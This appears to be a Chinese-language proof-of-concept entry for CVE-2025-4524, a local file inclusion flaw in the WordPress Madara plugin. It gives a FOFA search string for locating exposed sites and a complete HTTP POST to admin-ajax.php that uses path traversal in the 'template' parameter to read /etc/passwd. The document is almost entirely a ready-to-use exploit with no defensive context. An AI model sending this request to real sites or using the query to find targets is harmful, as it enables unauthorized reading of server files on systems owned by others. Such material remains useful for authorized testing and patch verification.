## WordPress Madara存在本地文件包含(CVE-2025-4524)


## fofa

```
body="/wp-content/plugins/madara/"
```

## poc
```javascript
POST /wp-admin/admin-ajax.php HTTP/2
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 490

action=madara_load_more&page=1&template=plugins/../../../../../../../etc/passwd&vars%5Borderby%5D=meta_value_num&vars%5Bpaged%5D=1&vars%5Btimerange%5D=&vars%5Bposts_per_page%5D=16&vars%5Btax_query%5D%5Brelation%5D=OR&vars%5Bmeta_query%5D%5B0%5D%5Brelation%5D=AND&vars%5Bmeta_query%5D%5Brelation%5D=AND&vars%5Bpost_type%5D=wp-manga&vars%5Bpost_status%5D=publish&vars%5Bmeta_key%5D=_latest_update&vars%5Border%5D=desc&vars%5Bsidebar%5D=right&vars%5Bmanga_archives_item_layout%5D=big_thumbnail
```
